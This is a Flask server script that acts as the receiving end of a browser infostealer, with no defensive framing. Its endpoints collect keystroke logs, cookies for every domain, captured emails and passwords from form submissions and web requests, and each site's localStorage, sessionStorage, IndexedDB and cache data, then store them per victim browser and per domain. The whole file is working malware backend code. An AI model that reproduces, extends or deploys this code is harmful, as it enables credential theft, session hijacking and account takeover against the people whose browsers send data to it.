from flask import Flask, request, jsonify, abort
from flask_cors import CORS

import requests
import json
from time import sleep
import random
import os
from threading import Lock
import urllib.parse



   
cwd=os.getcwd()

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

lock = Lock()
@app.route('/send_id_of_browser', methods=['POST'])    
def send_id_of_browser():
		try:
	
			browser_id = request.get_json()['browser_id']
			if not browser_id:
					abort(400, 'Missing id parameter')
			print(browser_id);      
			browser_folder=os.path.join(os.getcwd(), browser_id)
			if not os.path.exists(browser_folder):
						os.makedirs(browser_folder)

			return jsonify(state='success')   
		except:
				 
				return jsonify(error='Internal error')

@app.route('/send_keylog', methods=['POST'])    
def send_keylog():
		try:
	
			keylog = request.get_json()['keylog']
			browser_id=request.get_json()['browser_id']
			if not keylog:
					abort(400, 'Missing id parameter')
			print(keylog);        
			browser_folder=os.path.join(os.getcwd(), browser_id)
			if not os.path.exists(browser_folder):
						os.makedirs(browser_folder)
			with open(f"{browser_folder}\\keylog.txt", "a") as f:		
									f.write(keylog)			

			return jsonify(state='success')   
		except:
				 
				return jsonify(error='Internal error')
		

@app.route('/send_background_data', methods=['POST'])    
def send_background_data():
		try:
	
			
			cookie_data = request.get_json()['cookie_data']
			browser_id=request.get_json()['browser_id']
			if not cookie_data and browser_id:
					abort(400, 'Missing parameters')
			domain_list=[]        
		   
			for data in cookie_data:
				   print(data['domain'])
				   domain=data['domain']
				   if(domain[0]=='.'):
								domain=domain[1:]
				   domain_list.append(domain)

			for domain in domain_list:
					browser_folder=os.path.join(os.getcwd(), browser_id)
					data_folder = os.path.join(browser_folder, 'data')
					domain_folder = os.path.join(data_folder, domain)
					
					if not os.path.exists(domain_folder):
						os.makedirs(domain_folder)
					cookies_folder = os.path.join(f"{cwd}\\{browser_id}\\data\\{domain}", "cookies")
							

							
					if not os.path.exists(cookies_folder):
						os.makedirs(cookies_folder)				

			created_cookie_domains=[]			

			for data in cookie_data:
				   
					domain=data['domain']
					if(domain[0]=='.'):
								 domain=domain[1:]	

					if(created_cookie_domains.count(domain))>0:			
							 file_num=created_cookie_domains.count(domain)	
							 with open(f"{cwd}\\{browser_id}\\data\\{domain}\\cookies\\cookie_{file_num}.json", "w") as json_file:
									json.dump(data, json_file)	
									created_cookie_domains.append(domain)	
					else:		 	

							with open(f"{cwd}//{browser_id}\\data\\{domain}\\cookies\\cookie.json", "w") as json_file:
									json.dump(data, json_file)	
									created_cookie_domains.append(domain)	
							
									
				
							
						  
			return jsonify(state='success')   
		except Exception as e:
						print(e)
				 
						return jsonify(error='Internal error')
@app.route('/send_userpass_background', methods=['POST'])    
def send_userpass_background():
		try:
	
			
			url = request.get_json()['url']
			email = request.get_json()['email']
			password = request.get_json()['password']
			browser_id=request.get_json()['browser_id']

			if not url and email and password and browser_id :
					abort(400, 'Missing parameters')
			print(url,email,password) 
			try:       

				parsed_url = urllib.parse.urlparse(url)
				domain = parsed_url.netloc.split('.')[-2] + '.' + parsed_url.netloc.split('.')[-1]

			except:
						
								domain=url
			user_credentials_folder = os.path.join(f"{cwd}\\{browser_id}\\data\\{domain}", "user_credentials")				
			if not os.path.exists(user_credentials_folder):
						os.makedirs(user_credentials_folder)
			with open(f"{user_credentials_folder}\\webrequests.txt", "a") as f:		
									f.write(f"email={email} password={password}\n")	
							
		  
			
						  
			return jsonify(state='success')   
		except Exception as e:
						print(e)
				 
						return jsonify(error='Internal error')    

@app.route('/send_userpass_content', methods=['POST'])    
def send_userpass_content():
		try:
	
			
			url = request.get_json()['url']
			email = request.get_json()['email']
			password = request.get_json()['password']
			browser_id=request.get_json()['browser_id']

			if not url and email and password and browser_id:
					abort(400, 'Missing parameters')
			print(url,email,password) 
			try:       

				parsed_url = urllib.parse.urlparse(url)
				domain = parsed_url.netloc.split('.')[-2] + '.' + parsed_url.netloc.split('.')[-1]

			except:
						
								domain=url
			user_credentials_folder = os.path.join(f"{cwd}\\{browser_id}\\data\\{domain}", "user_credentials")				
			if not os.path.exists(user_credentials_folder):
						os.makedirs(user_credentials_folder)
			with open(f"{user_credentials_folder}\\formsubmit.txt", "a") as f:		
									f.write(f"email={email} password={password}\n")	
							
		  
			
						  
			return jsonify(state='success')   
		except Exception as e:
				print(e)
				 
				return jsonify(error='Internal error')    
@app.route('/send_storage_data', methods=['POST'])    
def send_storage_data():
		try:
	
			
				url = request.get_json()['url']
				localStorage = request.get_json()['localStorage']
				indexedDB = request.get_json()['indexedDB']
				browser_id= request.get_json()['browser_id']
				sessionStorage = request.get_json()['sessionStorage']
				
				caches=request.get_json()['caches']
				print(url)
				print(localStorage)
				print(indexedDB)
				print(sessionStorage)
				print(caches)
			



				if not url and localStorage and indexedDB and sessionStorage and browser_id and caches :
						abort(400, 'Missing parameters')

				try:       

					parsed_url = urllib.parse.urlparse(url)
					domain = parsed_url.netloc.split('.')[-2] + '.' + parsed_url.netloc.split('.')[-1]

				except:
						
								domain=url
				domain_folder = f"{cwd}\\{browser_id}\\data\\{domain}"				
				if not os.path.exists(domain_folder):
							os.makedirs(domain_folder)
				with open(f"{domain_folder}\\localStorage.json", "w") as json_file:
									json.dump(localStorage, json_file)	
											
											
				with open(f"{domain_folder}\\indexedDB.json", "w") as json_file:
									json.dump(indexedDB, json_file)	
				with open(f"{domain_folder}\\sessionStorage.json", "w") as json_file:
									json.dump(sessionStorage, json_file)	
				with open(f"{domain_folder}\\caches.json", "w") as json_file:
									json.dump(caches, json_file)											
												
																		
			  
				
							  
				return jsonify(state='success')   
		except Exception as e:
				print(e)
				 
				return jsonify(error='Internal error')    				  


										
				
	

if __name__ == '__main__':
	app.run()